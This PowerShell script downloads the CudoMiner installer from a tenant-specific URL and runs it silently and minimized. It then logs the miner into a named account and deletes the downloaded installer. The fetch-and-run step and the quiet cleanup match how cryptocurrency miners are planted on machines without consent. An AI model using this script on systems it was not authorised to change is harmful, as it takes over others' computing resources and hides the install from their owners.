$client = new-object System.Net.WebClient -ErrorAction Stop
$client.DownloadFile("https://download.cudo.org/tenants/135790374f46b0107c516a5f5e13069b/5e5f800fdf87209fdf8f9b61441e53a1/win/x64/stable/CudoMiner.exe","$Env:USERPROFILE\cudo.exe") ;
& Start-Process  $Env:USERPROFILE\cudo.exe /SP -WindowStyle Minimized
Start-Sleep -Seconds 70 -ErrorAction Stop
& 'C:\Program Files\Cudo Miner\cudominercli.exe' login rival-deer-290
Remove-Item "$Env:USERPROFILE\cudo.exe";
exit
